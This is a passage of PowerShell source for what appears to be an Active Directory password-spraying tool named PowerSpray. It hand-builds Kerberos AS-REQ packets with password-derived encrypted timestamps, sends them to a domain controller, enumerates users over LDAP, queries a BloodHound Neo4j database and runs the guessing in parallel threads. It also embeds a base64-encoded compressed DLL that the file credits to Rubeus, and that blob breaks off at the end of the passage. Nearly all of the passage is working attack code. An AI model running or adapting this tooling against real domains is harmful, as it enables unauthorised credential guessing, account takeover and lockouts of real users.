    $totalRequestBytes  = $LengthBytes + $ASREQ

    try {
        $Socket.Connect($EndPoint)
        $BytesSent = $Socket.Send($totalRequestBytes)

        $ResponseBuffer = New-Object Byte[] 65536
        $BytesReceived = $Socket.Receive($ResponseBuffer)
    }
    catch {
        throw "Error sending AS-REQ to '$TargetDCIP' : $_"
    }
    return $ResponseBuffer[4..$($BytesReceived-1)]
}

Function Local:New-ASReq {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory = $True)]
        [String]
        $ServiceName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [UInt32]
        $EncType,

        [Byte[]]
        $Key
    )

    # pvno            [1] INTEGER (5) = Kerberos protocol version number for windows
    $pvnoAsn = [Asn1.AsnElt]::MakeInteger(5)
    $pvnoSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($pvnoAsn))
    $pvno = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $pvnoSeq)

    # msg-type        [2] INTEGER (10 -- AS -- ) = KRB-AS-REQ
    $msg_type_ASN = [Asn1.AsnElt]::MakeInteger(10)
    $msg_type_ASNSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($msg_type_ASN))
    $msgType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $msg_type_ASNSeq)

    # PA-DATA
    $padatas = @()
    if ($Key) {
        #   padata-type   [1] Int32 (2 = ENC_TIMESTAMP)
        $padataNameType = [Asn1.AsnElt]::MakeInteger(2)
        $padataNameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataNameType))
        $padataType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $padataNameTypeSeq)

        $patimestamp = [DateTime]::UtcNow
        $patimestampAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::GeneralizedTime, $patimestamp.ToString("yyyyMMddHHmmssZ"))
        $patimestampSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($patimestampAsn))
        $patimestampSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $patimestampSeq)
        $totalSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($patimestampSeq))
        $data = $totalSeq.Encode()
        # KeyUsage 1 = KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP
        $encData = KerberosEncrypt -eType $EncType -keyUsage 1 -key $Key -data $data
        # etype   [0] Int32 -- EncryptionType --
        $etypeAsn = [Asn1.AsnElt]::MakeInteger($EncType)
        $etypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeAsn))
        $etypeSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $etypeSeq)
        # cipher  [2] OCTET STRING -- ciphertext
        $cipherAsn = [Asn1.AsnElt]::MakeBlob($encData);
        $cipherSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cipherAsn))
        $cipherSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $cipherSeq)
        $cipherEltSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeSeq, $cipherSeq))

        $blob = [Asn1.AsnElt]::MakeBlob($cipherEltSeq.Encode())
        $blobSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($blob))
        $blobSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $blobSeq)
        $padataEltSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataType, $blobSeq))
        $padatas += $padataEltSeq
    }

    #   padata-type   [1] Int32 (128 = PA_PAC_REQUEST)
    $padataNameType = [Asn1.AsnElt]::MakeInteger(128)
    $padataNameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataNameType))
    $padataType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $padataNameTypeSeq)
    #   padata-value  [2] OCTET STRING (encoded KRB5-PADATA-PA-PAC-REQUEST with include_pac = true)
    $include_pac = [Asn1.AsnElt]::MakeBlob(@(0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x01))
    $paDataElt = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($include_pac))
    $paData = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $paDataElt)
    # PA-DATA         ::= SEQUENCE
    $padataEltSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padataType, $paData))
    $padatas += $padataEltSeq
    # padata          [3] SEQUENCE OF PA-DATA OPTIONAL
    $padata_ASNSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, $padatas)
    $padata_ASNSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($padata_ASNSeq))
    $padata = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 3, $padata_ASNSeq2)

    # kdc-options     [0] KDCOptions (forwardable, renewable, renewable-ok)
    $kdcOptionsAsn = [Asn1.AsnElt]::MakeBitString(@(0x40,0x80,0x00,0x10))
    $kdcOptionsSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($kdcOptionsAsn))
    $kdcOptions = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $kdcOptionsSeq)

    # cname           [1] PrincipalName OPTIONAL ::= SEQUENCE
    #   name-type     [0] Int32 (1 = KRB5-NT-PRINCIPAL)
    $cnameTypeElt = [Asn1.AsnElt]::MakeInteger(1)
    $cnameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameTypeElt))
    $cnameType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $cnameTypeSeq)
    #   name-string   [1] SEQUENCE OF KerberosString [List<string>]
    $cnameStringElt = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::UTF8String, $UserName)
    $cnameStringElt = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $cnameStringElt)
    $cstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameStringElt))
    $cstringSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cstringSeq))
    $cnameString = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $cstringSeq2)
    # cname         ::= SEQUENCE
    $cnameSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameType, $cnameString))
    $cnameElt = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($cnameSeq))
    $cname = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $cnameElt)

    # realm           [2] Realm
    $realmAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Domain)
    $realmAsn = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $realmAsn)
    $realmSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($realmAsn))
    $realm = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 2, $realmSeq)

    # sname           [3] PrincipalName OPTIONAL ::= SEQUENCE
    #   name-type     [0] Int32 (1 = KRB5-NT-PRINCIPAL)
    $snameTypeElt = [Asn1.AsnElt]::MakeInteger(1)
    $snameTypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameTypeElt))
    $snameType = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 0, $snameTypeSeq)
    #   name-string   [1] SEQUENCE OF KerberosString [List<string>]
    $snameStringElt1 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $ServiceName)
    $snameStringElt1 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt1)
    if ($ServiceName -eq 'krbtgt') {
        $snameStringElt2 = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::IA5String, $Domain)
        $snameStringElt2 = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::UNIVERSAL, [Asn1.AsnElt]::GeneralString, $snameStringElt2)
        $sstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameStringElt1, $snameStringElt2))
    }
    else {
        $sstringSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameStringElt1))
    }
    $sstringSeq2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($sstringSeq))
    $snameString = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 1, $sstringSeq2)
    # sname         ::= SEQUENCE
    $snameSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameType, $snameString))
    $snameElt = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($snameSeq))
    $sname = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 3, $snameElt)

    # till            [5] KerberosTime
    $tillDate = [DateTime]::ParseExact("20370913024805Z", "yyyyMMddHHmmssZ", [Globalization.CultureInfo]::InvariantCulture)
    $tillAsn = [Asn1.AsnElt]::MakeString([Asn1.AsnElt]::GeneralizedTime, $tillDate.ToString("yyyyMMddHHmmssZ"))
    $tillSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($tillAsn))
    $till = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 5, $tillSeq)

    # nonce           [7] UInt32
    $nonceAsn = [Asn1.AsnElt]::MakeInteger(1818848256)
    $nonceSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($nonceAsn))
    $nonce = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 7, $nonceSeq)

    # etype           [8] SEQUENCE OF Int32 -- EncryptionType -- in preference order --
    $etypeAsn = [Asn1.AsnElt]::MakeInteger($EncType)
    $etypeSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeAsn))
    $etypeSeqTotal1 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($etypeAsn))
    $etypeSeqTotal2 = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, $etypeSeqTotal1)
    $etype = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 8, $etypeSeqTotal2)

    # req-body        [4] KDC-REQ-BODY
    $req_Body_ASN = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($kdcOptions, $cname, $realm, $sname, $till, $nonce, $etype))
    $req_Body_ASNSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($req_Body_ASN))
    $reqBodySeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::CONTEXT, 4, $req_Body_ASNSeq)

    # final AS-REQ ASN.1 structure
    $asReqSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($pvno, $msgType, $padata, $reqBodySeq))

    # AS-REQ              [APPLICATION 10] = KDC-REQ
    $totalSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($asReqSeq))
    $appSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::APPLICATION, 10, $totalSeq)

    return $appSeq.Encode()
}

Function Local:KerberosPasswordHash {
    [CmdletBinding()]
    param ( 
        [parameter(Mandatory=$True)]
        [UInt32]
        $eType,

        [parameter(Mandatory=$True)]
        [AllowEmptyString()]
        [String]
        $Password,

        [parameter(Mandatory=$True)]
        [String]
        $Salt,

        [parameter(Mandatory=$False)]
        [int]
        $Count = 4096
    )

    $KERB_ECRYPT = [PowerSpray.Win32+KERB_ECRYPT]
    $UNICODE_STRING = [PowerSpray.Win32+UNICODE_STRING]

    $kerbEcryptSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
    $pCSystemPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
    $status = [PowerSpray.Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
    }
    $pCSystem = [Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)

    $passwordUnicode = New-Object $UNICODE_STRING $Password
    $saltUnicode = New-Object $UNICODE_STRING $Salt
    $output = New-Object Byte[] $pCSystem.KeySize

    $KerbEcryptHashPasswordDelegate = Get-DelegateType @($UNICODE_STRING, $UNICODE_STRING, [int], [byte[]]) ([int])
    $KerbEcryptHashPassword = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.HashPassword, $KerbEcryptHashPasswordDelegate)
    $status = $KerbEcryptHashPassword.Invoke($passwordUnicode, $saltUnicode, $Count, $output)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status)
    }

    return $output
}

Function Local:KerberosEncrypt {
    [CmdletBinding()]
    param ( 
        [parameter(Mandatory=$true)]
        [UInt32]
        $eType,

        [parameter(Mandatory=$true)]
        [int]
        $keyUsage,

        [parameter(Mandatory=$true)]
        [byte[]]
        $key,

        [parameter(Mandatory=$true)]
        [byte[]]
        $data
    )

    $KERB_ECRYPT = [PowerSpray.Win32+KERB_ECRYPT]

    $kerbEcryptSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
    $pCSystemPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
    $status = [PowerSpray.Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
    }
    $pCSystem = [Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)

    $outputSize = $data.Length
    if($data.Length % $pCSystem.BlockSize -ne 0) {
        $outputSize += $pCSystem.BlockSize - ($data.Length % $pCSystem.BlockSize)
    }
    $outputSize += $pCSystem.Size
    $output = New-Object Byte[] $outputSize

    $pContext = [IntPtr]::Zero
    $KerbEcryptInitializeDelegate = Get-DelegateType @([byte[]], [int], [int], [IntPtr].MakeByRefType()) ([int])
    $KerbEcryptInitialize = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Initialize, $KerbEcryptInitializeDelegate)
    $status = $KerbEcryptInitialize.Invoke($key, $key.Length, $keyUsage, [ref]$pContext)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status)
    }

    $KerbEcryptEncryptDelegate = Get-DelegateType @([IntPtr], [byte[]], [int], [byte[]], [IntPtr].MakeByRefType()) ([int])
    $KerbEcryptEncrypt = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Encrypt, $KerbEcryptEncryptDelegate)
    $KerbEcryptEncrypt.Invoke($pContext, $data, $data.Length, $output, [ref]$outputSize) | Out-Null

    $KerbEcryptFinishDelegate = Get-DelegateType @([IntPtr].MakeByRefType()) ([int])
    $KerbEcryptFinish = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Finish, $KerbEcryptFinishDelegate)
    $KerbEcryptFinish.Invoke([ref]$pContext) | Out-Null

    return $output
}

Function Local:Get-LdapObject {
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ADSpath,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    if ($Credential.UserName) {
        $domainObject = New-Object DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
    }
    else {
        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
    }
    $searcher.SearchScope = $SearchScope
    $searcher.PageSize = $PageSize
    $searcher.CacheResults = $false
    $searcher.filter = $Filter
    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
    try {
        $results = $searcher.FindAll()
        $results | Where-Object {$_} | ForEach-Object {
            $objectProperties = @{}
            $p = $_.Properties
            $p.PropertyNames | ForEach-Object {
                if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
        $results.dispose()
        $searcher.dispose()
    }
    catch {
        Write-Error $_ -ErrorAction Stop
    }
}

# Adapted from https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1
Function Local:Get-LdapCurrentUser {
    [CmdletBinding()]
    Param (
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null

        $conn = New-Object DirectoryServices.Protocols.LdapConnection $Server
        if ($Credential.UserName) {
            $conn.Credential = $Credential
        }

        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
        $extRequest = New-Object DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = $conn.SendRequest($extRequest)
        [Text.Encoding]::ASCII.GetString($resp.ResponseValue)
    }
    catch {
        Write-Error $_
    }
}

Function Local:New-BloodHoundQuery {
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Neo4jHost = '127.0.0.1',

        [ValidateNotNullOrEmpty()]
        [Int32]
        $Neo4jPort = 7474,

        [ValidateNotNullOrEmpty()]
        [String]
        $Query,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $Uri = "http://$($Neo4jHost):$($Neo4jPort)/db/data/cypher"
    $Header = @{'Accept'='application/json; charset=UTF-8'; 'Content-Type'='application/json'}
    $Body = @{query=$Query} | ConvertTo-Json
    $reply = Invoke-RestMethod -Uri $Uri -Method Post -Headers $Header -Body $Body -Credential $Credential -Verbose:$false
    if($reply){
        return $reply
    }
}

Function Local:New-ThreadedFunction {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [Array]
        $Collection,

        [Parameter(Mandatory = $True)]
        [Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 2,

        [Switch]
        $NoImports
    )

    BEGIN {
        $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [Threading.Thread]::CurrentThread.GetApartmentState()

        # Import the current session state's variables and functions so the chained functionality can be used by the threaded blocks
        if (-not $NoImports) {
            # Grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # These variables are added by Runspace.Open() method and produce Stop errors if added twice
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # Add variables from Parent Scope (current runspace) into the InitialSessionState
            foreach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                    $SessionState.Variables.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # Add functions from current runspace to the InitialSessionState
            foreach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # Create a pool of $Threads runspaces
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # Get the proper BeginInvoke() method that allows for an output queue
        $Method = $null
        foreach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $Collection = $Collection | Where-Object {$_}
        Write-Verbose "[THREAD] Processing $($Collection.Count) elements with $Threads threads."

        # Partition collection into $Threads number of groups
        if ($Threads -ge $Collection.Count) {
            $Threads = $Collection.Count
        }
        $ElementSplitSize = [Int]($Collection.Count/$Threads)
        $CollectionPartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $Collection.Count
            }
            $List.AddRange($Collection[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $CollectionPartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose "[THREAD] Total number of threads/partitions: $Threads"

        foreach ($CollectionPartition in $CollectionPartitioned) {
            # Create a "powershell pipeline runner"
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # Add the script block and arguments
            $null = $PowerShell.AddScript($ScriptBlock).AddParameter('Collection', $CollectionPartition)
            if ($ScriptParameters) {
                foreach ($Param in $ScriptParameters.GetEnumerator()) {
                    $null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # Create the output queue
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # Start job
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[THREAD] Threads executing"

        # Continuously loop through each job queue, consuming output as appropriate
        do {
            foreach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        while (($Jobs | Where-Object {-not $_.Result.IsCompleted}).Count -gt 0)

        $SleepSeconds = 10
        Write-Verbose "[THREAD] Waiting $SleepSeconds seconds for final cleanup..."

        # Cleanup
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            foreach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -Seconds 1
        }

        $Pool.Dispose()
        Write-Verbose "[THREAD] all threads completed"
    }
}

Function Local:Get-DelegateType {
    Param (
        [OutputType([Type])]

        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),

        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    Write-Output $TypeBuilder.CreateType()
}

$Win32 = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace PowerSpray {
    public class Win32 {
        [DllImport("cryptdll.dll", CharSet = CharSet.Auto, SetLastError = false)]
        public static extern int CDLocateCSystem(UInt32 type, out IntPtr pCheckSum);

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public UNICODE_STRING(string s) {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose() {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString() {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_ECRYPT {
            int Type0;
            public int BlockSize;
            int Type1;
            public int KeySize;
            public int Size;
            int unk2;
            int unk3;
            public IntPtr AlgName;
            public IntPtr Initialize;
            public IntPtr Encrypt;
            public IntPtr Decrypt;
            public IntPtr Finish;
            public IntPtr HashPassword;
            IntPtr RandomKey;
            IntPtr Control;
            IntPtr unk0_null;
            IntPtr unk1_null;
            IntPtr unk2_null;
        }
    }
}
"@
Add-Type -TypeDefinition $Win32

# Asn1 library adapted from https://github.com/GhostPack/Rubeus (BSD 3-Clause license)
$EncodedCompressedDll = @'
7Xx7eFvXcee5D9wHAEK8gASQEilA1gsi+KYkU5JlmiIpiTJFKiIlg45tCiQhCTJFKAAoS7IVyxsntdexE9V52Kkd13bWTZO2SfMljdtuE2/jdOs0TmrF200ax3EfaeN2vzpt+kjrrbW/mXMvAD6kOF+3X//ple7cmTlz5sw5Z86cx73E/ps/KDQhhI778mUhnhXyukH89OsC7lD8t0Li8/aLa55Vhl5cM3Y8V0ycKuSPFTInE1OZ2dl8KTGZTRTmZhO52UT/yGjiZH4621pT41/n6jgwIMSQoonvr/7RJzy9r4lrEgGlXYhbQBiS98w5gIRbqBC1jKvSblERE+I5yadLE0feS6L0v/IsP/gag94RtzJ/ry5RyV8UIohHN+Qa3kablC/YZ1WRFui9VXRrKXumhOev3OzW65aK3VUqjrQWioUp4doGG7nCt82XuwH/WwvZmfyUtJVsZl2Ti+R2LTTzvnPyuZez+MTXB4WYQdMrb6uSi6/VahIm+JtWq3cmYWzTNap2nhEwNnmMTS6jyWMw0qQm0YvG8rc0kJF2VYwKtsNR79yA9Ghbn5pEkxrNLVG/FA1EgynHtD5WY9h5P+i034qlg5b5UK7zddU4T7lSIVW98xogD+WYlrqaoF8THbKZoH8d61+jJm1o8atqEq1sJFcAGMkoKTbS59dxboJNB6UhLYECzDtVPAb8nMdsDhTWVJh/pCYDQLRoZ0CTNsO2WGEnJJYpyRq0VDIEIKWlgPaxpg1qVEsuA970jJpUiddlS5v01mjhdmRWkxGysJIXTYY66SLt1YnL9YrUWnevenAVWnN9tPAgsj+1PuYl+cOC7XhqfV3hDzip3rXsqfUrCz8gDpniFXOVMtoqZbx+5TIalX9LGR2VMrYoVywj+9PL2Ccb1u3p5dTW7BOfcR1fHaCBNuIOJKQL+I1IbS2cV+Z3XVPho4s4v7yI89vgqO9fCcs1hslaYmux8YHVUOvDjWoKB3cMdyPutbgxTkQb7i24d+Duxb0H937cv+reNEjGcU/gzuKGd4h34b4D93nc78F9P+4P4P4w7l/A/STuX8Ld/UmAwndhW1Phrxm+ydBRCaYYbmE4zvA8ww8wfJThZxi+wPD7DP+ZYUAjGGHYxnCE4e0M72f4OMNfZfgiw9cZ+nSCaxj2MpxieIc+v1WjDwapJR1qSY4XKz2ficfb1VhTzJ+yjVjarzZO1Qo12v5jw40rjZ5c4gI1cLXo6rJopxpVH8rFkivJNZpUTXdRydckQfos7hKN9Gl6WISVsC+shrUkZgsjovuaax1dbw0UHtS9oODoDyJNiRiq5hhRR0+GUQOJrXL90BKfExzql9RZVOhhOIaRR7F4mnkfP9XzFOkcQzu/lp+OzlHLMazz6/lpcwx0jNj5jfT0Ne8pIo74I6ZVq1h2OmKl1sAoSxtnSyK25tgc8dK1imM6dh7jwI/0zj+GbjOP+OjPmxBMWY6xnDHHa5NJhd3a0fS0XwtoRhKNboR0VVsfg7KLYyFfSN8XT0xE39IOEtowNRbSiRWfGONHV09Ij465Gb1sNUhKXMY6pSNQ+Ey5QTlj46Qdv3viyJjNnTrR8tUFWYMWJ3SFVwRDvj0thwv/q5xfpnT0yed4RNcc